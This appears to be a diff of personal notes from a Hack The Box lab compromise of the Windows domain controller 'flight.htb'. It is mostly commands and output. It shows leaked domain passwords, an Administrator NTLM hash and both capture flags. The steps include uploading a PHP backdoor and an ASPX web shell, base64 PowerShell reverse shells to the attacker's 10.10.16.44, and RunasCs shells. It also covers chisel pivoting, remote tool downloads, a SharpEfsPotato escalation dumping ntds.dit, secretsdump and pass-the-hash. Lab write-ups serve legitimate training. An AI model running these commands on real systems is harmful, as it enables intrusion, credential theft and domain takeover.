@@ -12,10 +12,12 @@
 // flight.htb\svc_apache	: S@Ss!K@*t13
 // flight.htb\S.Moon 		: S@Ss!K@*t13
 // flight.htb\c.bum			: Tikkycoll_431012284
+// flight.htb\Administrator	: 43bbfc530bab76141b12c8446e30c17c
+
 
 //FLAGS:
 //User:		eed322aedd8336099702d428a3facdc
-//System: 
+//System:	542a4cf33c7176582d469009c511bb0c 
 |================================================================
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 
@@ -685,6 +687,8 @@ Web
 cat user.txt   
 //eed322aedd8336099702d428a3facdc
 
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
 
 // WebShell Creation
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
@@ -939,9 +943,24 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.43 LPORT=6969 -f exe -o
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
+#####################
+#############################
+#####################
 
 // STARTING AGAIN from Break
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+# add /etc/hosts entry nix
+sudo sh -c "echo '10.10.11.187 school.flight.htb g0.flight.htb flight.htb' >> /etc/hosts"
+cat /etc/hosts
+
+2023-03-30 19:01:06 EDT -- 
+impacket-smbclient 'flight.htb/c.bum:Tikkycoll_431012284@10.10.11.187'
+
+use WEB
+cd school.flight.htb
+put backdoor.php
+
 
 // Rev-Shell
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
@@ -951,8 +970,6 @@ sudo rlwrap -cAr nc -lvnp 443
 curl -k 'http://school.flight.htb/backdoor.php?cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANAA0ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA%2BACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA%2BACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA%3D'
 
 //SUCCESS!!!
-
->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
@@ -983,25 +1000,492 @@ Active Connections
 #Diff from Nmap scan
 //TCP    0.0.0.0:8000
 
-
-
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
 
+// C.Bum Session
+// Since we can put files as apache and run them we need a rev shell as C.Bum
+// Creds were looted previously with desktop.ini trick
+## RunasCS
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+https://github.com/antonioCoco/RunasCs/
+
+wget https://github.com/antonioCoco/RunasCs/releases/download/v1.4/RunasCs.zip
+unzip RunasCs.zip -d RunasCs
+
+//From C.Bum SMB connection
+2023-03-30 19:40:59 EDT -- 
+impacket-smbclient 'flight.htb/c.bum:Tikkycoll_431012284@10.10.11.187'
+
+//Permissions for C.Bumb
+Shared          READ,WRITE //Doesn't allow .exe
+Web             READ,WRITE
+
+# use Web
+# cd school.flight.htb
+# put RunasCs/RunasCs.exe
+
+//From flight\svc_apache PS RevShell
+2023-03-30 20:14:00 EDT -- 
+net share
+
+Share name   Resource                        Remark
+
+-------------------------------------------------------------------------------
+C$           C:\                             Default share                     
+IPC$                                         Remote IPC                        
+ADMIN$       C:\Windows                      Remote Admin                      
+NETLOGON     C:\Windows\SYSVOL\sysvol\flight.htb\SCRIPTS
+                                             Logon server share                
+Shared       C:\Shared                       
+SYSVOL       C:\Windows\SYSVOL\sysvol        Logon server share                
+Users        C:\Users                        
+Web          C:\xampp\htdocs
+
+cd C:\xampp\htdocs
+ls
+
+
+    Directory: C:\xampp\htdocs
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        3/31/2023  12:12 AM                flight.htb                                                            
+d-----        3/31/2023  12:12 AM                school.flight.htb
+
+.\RunasCs.exe -h
+#Usage:
+#   RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--create-profile] [--bypass-uac]
+
+## Redirect stdin, stdout and stderr of the specified command to a remote host
+   //RunasCs.exe user1 password1 cmd.exe -r 10.10.10.24:4444
+
+//Start Listener
+sudo rlwrap -cAr nc -lvnp 6969
+
+//Creds:
+// flight.htb\c.bum         : Tikkycoll_431012284
+2023-03-30 20:31:04 EDT -- 
+.\RunasCs.exe c.bum Tikkycoll_431012284 powershell.exe -r 10.10.16.44:6969 --bypass-uac
+//[-] RunasCsException: [!] Failed to set the token's Integrity Level: High
+
+2023-03-30 20:32:44 EDT -- 
+.\RunasCs.exe c.bum Tikkycoll_431012284 powershell.exe -r 10.10.16.44:6969
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-596b6$\Default
+[+] Async process 'powershell.exe' with pid 4572 created and left in background.
+
+2023-03-30 20:41:10 EDT -- 
+PS C:\Windows\system32> whoami
+whoami
+flight\c.bum
+
+//SUCCESS
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+-- privesc --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+cd C:\Users\C.Bum\AppData\Local\Temp
+net use \\10.10.16.44\Public
+//System error 1272 has occurred.
+//You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
+
+wget https://github.com/carlospolop/PEASS-ng/releases/download/20230312/winPEASany.exe
+
+python3 -m http.server 443
+
+2023-03-30 20:49:27 EDT -- 
+(New-Object System.Net.WebClient).DownloadFile('http://10.10.16.44:443/winPEASany.exe', 'C:\Users\C.Bum\AppData\Local\Temp\wPEAS.exe')
+
+2023-03-30 20:53:54 EDT -- 
+./wPEAS.exe -lolbas log=\\10.10.16.44\Public\wPEAS_CBum.out
+
+//[X] Exception: Cannot open "\\10.10.16.44\Public\wPEAS.out" for writing:
+//You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
+
+2023-03-30 20:53:59 EDT -- 
+./wPEAS.exe -lolbas log=wPEAS_CBum.out
+
+
+2023-03-30 21:01:56 EDT -- 
+nc -lnvp 443 > wPEAS_CBum.out
+
+Invoke-RestMethod -Uri http://10.10.16.44:443/wPEAS_CBum.out -Method Post -InFile wPEAS_CBum.out
+
+//Nothing of interest, looking into port 8000 since it is running as the system process
 
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
+// Pivoting Network with Chisel to port 8000
+// chisel
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// browse to https://github.com/jpillora/chisel/releases
+// get correct download links
+
+2023-03-30 21:15:38 EDT -- 
+// download chisel for windows
+wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_windows_amd64.gz
+
+gunzip -d chisel_1.8.1_windows_amd64.gz
+
+file chisel_1.8.1_windows_amd64
+//chisel_1.8.1_windows_amd64: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows
+
+mv chisel_1.8.1_windows_amd64 chisel.exe
+
+2023-03-30 21:27:12 EDT -- 
+(New-Object System.Net.WebClient).DownloadFile('http://10.10.16.44:443/chisel.exe', 'C:\Users\C.Bum\AppData\Local\Temp\chisel.exe')
+
+//SUCCESSFUL Download
+
+// linux server with target client calling back
+  // kali
+2023-03-30 21:29:18 EDT -- 
+sudo chisel server --port 443 --reverse
+
+  // target
+// upload chisel.exe
+2023-03-30 21:39:13 EDT -- 
+./chisel.exe client --fingerprint=2PO985xfjhu/CZeQ/Cmc2bOb/ohzJfI5zTBqNBZfJUE= 10.10.16.44:443 R:127.0.0.1:8000:127.0.0.1:8000 
+
+
+// nmap --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+// SCAN
+2023-03-30 21:46:33 EDT -- 
+nmap -e tun0 -Pn -A --script=default,vuln -p8000 127.0.0.1 -oN port_8000.nmap
+
+PORT     STATE    SERVICE  VERSION
+8000/tcp filtered http-alt
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+2023-03-30 21:51:58 EDT -- 
+firefox-esr http://127.0.0.1:8000/
+//Another Flight Website
+
+//Find where the site is hosted on remote target
+ 	TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
+	w3wp.exe                      3280 N/A
+
+ls C:\inetpub
+
+
+    Directory: C:\inetpub
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        9/22/2022  12:24 PM                custerr                                                               
+d-----        3/31/2023   2:07 AM                development                                                           
+d-----        9/22/2022   1:08 PM                history                                                               
+d-----        9/22/2022  12:32 PM                logs                                                                  
+d-----        9/22/2022  12:24 PM                temp                                                                  
+d-----        9/22/2022  12:28 PM                wwwroot
+
+//development has an index.html file running on IIS(w3wp.exe)
+
+2023-03-30 22:11:05 EDT -- 
+icacls C:\inetpub\development
+
+C:\inetpub\development flight\C.Bum:(OI)(CI)(W)
+                       NT SERVICE\TrustedInstaller:(I)(F)
+                       NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
+                       NT AUTHORITY\SYSTEM:(I)(F)
+                       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
+                       BUILTIN\Administrators:(I)(F)
+                       BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+                       BUILTIN\Users:(I)(RX)
+                       BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
+                       CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+
+//C.Bum has Write access
+// Use aspx web shell since it has IIS running for the development site
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+// WebShell - ASPX 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+webshells
+cd aspx
+
+cp /usr/share/webshells/aspx/cmdasp.aspx ~/haxterm/data/10.10.11.187
+
+//Accidently Killed my Chisel Connection, need to reconnect and upload aspx webshell
+
+//Starting Two PS REvShells for C.Bum
+//Files delete so fast, just want to connections for redun
+
+//Term1 (Chisel)
+sudo rlwrap -cAr nc -lvnp 6969
+# put RunasCs/RunasCs.exe
+.\RunasCs.exe c.bum Tikkycoll_431012284 powershell.exe -r 10.10.16.44:6969
+
+//Term2 (Misc)
+sudo rlwrap -cAr nc -lvnp 6969
+.\RunasCs.exe c.bum Tikkycoll_431012284 powershell.exe -r 10.10.16.44:6969
+
+
+//Start Chisel up again
+	// kali
+2023-03-30 22:41:30 EDT -- 
+sudo chisel server --port 443 --reverse
+
+	// target
+cd C:\Users\C.Bum\AppData\Local\Temp
+
+(New-Object System.Net.WebClient).DownloadFile('http://10.10.16.44:6969/chisel.exe', 'C:\Users\C.Bum\AppData\Local\Temp\chisel.exe')
+
+2023-03-30 22:55:06 EDT -- 
+./chisel.exe client --fingerprint=NlTV9H38d8qZWEkw7zeNSr0fwdk+ZQ4PpxVTKx4Q6WM= 10.10.16.44:443 R:127.0.0.1:8000:127.0.0.1:8000
+
+//SUCCESS
+
+//From C.Bum SMBClient
+# put cmdasp.aspx
+
+//From C.Bum PS RevShell2
+2023-03-30 23:01:01 EDT --  
+cp c:\xampp\htdocs\school.flight.htb\cmdasp.aspx c:\inetpub\development
+
+
+2023-03-30 23:01:31 EDT -- 
+firefox-esr http://127.0.0.1:8000/cmdasp.aspx
+//Browse (whoami /all)
+
+User Name                  SID                                                          
+========================== =============================================================
+iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
+
+Group Name                                 Type             SID          Attributes                                        
+========================================== ================ ============ ==================================================
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                   
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                       Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+BUILTIN\IIS_IUSRS                          Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
+LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+                                           Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANAA0ACIALAA2ADkANgA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
+
+whoami
+iis apppool\defaultapppool
+
+//SUCCESS
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+copy \\10.10.16.44\Public\winPEASany.exe .
+
+python3 -m http.server 6969
+
+2023-03-30 23:28:46 EDT -- 
+(New-Object System.Net.WebClient).DownloadFile('http://10.10.16.44:6969/winPEASany.exe', 'C:\Windows\Temp\winPEASany.exe')
+
+2023-03-30 23:30:49 EDT -- 
+.\winPEASany.exe -lolbas log=wPEAS_iisAppPool.out
+
+2023-03-30 23:40:29 EDT -- 
+nc -lnvp 6969 > wPEAS_iisAppPool.out
+
+Invoke-RestMethod -Uri http://10.10.16.44:6969/wPEAS_iisAppPool.out -Method Post -InFile wPEAS_iisAppPool.out
+
+// wPEAS Out
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+Hostname: g0
+    Domain Name: flight.htb
+    ProductName: Windows Server 2019 Standard
+    EditionID: ServerStandard
+    ReleaseId: 1809
+
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
 
+// POTATO TIME
+//I have no credentials, but have access to the DC, it's possible to dump the ntds.dit using a lolbin ntdsutil.exe:
+//SweetPotato 		FAIL
+//SharpEFSPotato 	SUCCESS
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+https://github.com/durt-git/potato-binaries/blob/main/sweetpotato/SweetPotato.exe
+
+cp ~/Downloads/SweetPotato.exe .
+
+python3 -m http.server 6969
+
+cd C:\Windows\Temp
+mkdir Hax
+
+2023-03-30 23:57:01 EDT -- 
+(New-Object System.Net.WebClient).DownloadFile('http://10.10.16.44:6969/SweetPotato.exe', 'C:\Windows\Temp\SweetPotato.exe')
+
+2023-03-31 00:48:25 EDT -- 
+.\SweetPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe "ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\Windows\Temp\hax' q q"
+
+//SweetPotato FAIL
+
+https://github.com/durt-git/potato-binaries/tree/main/sharpefspotato
+
+cp ~/Downloads/SharpEfsPotato.exe .
+
+2023-03-31 01:05:22 EDT -- 
+(New-Object System.Net.WebClient).DownloadFile('http://10.10.16.44:6969/SharpEfsPotato.exe', 'C:\Windows\Temp\SharpEfsPotato.exe')
+
+2023-03-31 01:07:43 EDT -- 
+.\SharpEfsPotato.exe -p powershell.exe "ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\Windows\Temp\hax' q q"
+[+] Triggering name pipe access on evil PIPE \\localhost/pipe/abe1f921-6da4-4626-8192-2b8a6c98b7b2/\abe1f921-6da4-4626-8192-2b8a6c98b7b2\abe1f921-6da4-4626-8192-2b8a6c98b7b2
+df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
+[x]RpcBindingSetAuthInfo failed with status 0x6d3
+[+] Server connected to our evil RPC pipe
+[+] Duplicated impersonation token ready for process creation
+[+] Intercepted and authenticated successfully, launching program
+[!] Failed to created impersonated process with token: 2
+
+2023-03-31 01:10:43 EDT -- 
+.\SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\Windows\Temp\hax' q q"
+
+//SUCCESS
+# NOTES:
+	//Need powershell -a option
+	//Need full powershell path to work
+
+2023-03-31 01:22:14 EDT -- 
+cp 'C:\windows\temp\hax\Active Directory\ntds.dit' c:\xampp\htdocs\school.flight.htb\
+cp 'C:\windows\temp\hax\registry\SYSTEM' c:\xampp\htdocs\school.flight.htb\
+
+//Can't copy the files due to permissions
+//Create c.bum directory since they have write access
+
+//From c.bum PS RevShell
+mkdir C:\hax
+
+2023-03-31 01:39:50 EDT -- 
+//From iis apppool\defaultapppool
+.\SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\hax' q q"
+
+//From c.bum PS RevShell
+cp 'C:\hax\Active Directory\ntds.dit' c:\xampp\htdocs\school.flight.htb\
+cp 'C:\hax\registry\SYSTEM' c:\xampp\htdocs\school.flight.htb\
+
+//From c.bum SMB Client
+# get ntds.dit
+# get SYSTEM
+
+//From c.bum PS RevShell
+get-filehash 'C:\hax\Active Directory\ntds.dit' -Algorithm md5
+//843889BA778299FB27736A478058DBEA
+get-filehash 'C:\hax\registry\SYSTEM' -Algorithm md5
+//D4FC6C044FC52274C0D82FE759745D11
+
+//From Kali
+md5sum ntds.dit        
+843889ba778299fb27736a478058dbea  ntds.dit
+md5sum SYSTEM 
+d4fc6c044fc52274c0d82fe759745d11  SYSTEM
+
+//Hashes Match
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
+// IMPACET-SECRETDUMP
+//Administrator	:	aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL -outputfile hashdump
+
+//Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Administrator Connect
+// SMB Client
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2023-03-31 02:10:19 EDT -- 
+impacket-smbclient -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c 'flight.htb/Administrator@10.10.11.187'
+
+# use C$
+cd Users\Administrator\Desktop
+
+# cat root.txt
+542a4cf33c7176582d469009c511bb0c
+
+# get root.txt
+
+//SUCCESS
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+#PWNED
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡶⠶⠖⠛⠛⠛⠳⠶⠶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢀⣴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢠⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⠀⠉⢿⡀⠀⠀⠀⠀⠀⠀⣠⡶⠶⣄⠀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢠⡿⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⣰⠇⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⢸⠏⠀⠀⢸⡆⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⢀⣾⠀⠀⠀⠀⠀⢰⣿⠀⠀⠀⣸⠁⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⠀⣠⡾⠁⠀⠀⠀⠀⠀⠈⢿⡀⠒⣰⡏⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⢰⡟⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠶⠟⠋⣠⡴⠶⠟⠒⢶⣄⠀⠈⠉⠉⠉⠀⠀⢠⡿⡀⠀⠀⠀⢀⣶⠶⣦⠀⠀
+⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⢠⡟⢻⡏⢤⣟⡄⠀
+⢰⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠁⠀⠀⠘⠿⠚⠻⠾⠋⠁⠀
+⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢀⣤⣤⣤⡀
+⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⣿⠹⣗⡆⣸⡇
+⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠀⠻⠖⠷⣧⠟⠀
+⡏⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⠀⠀⠀⠀⠀⠈⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀
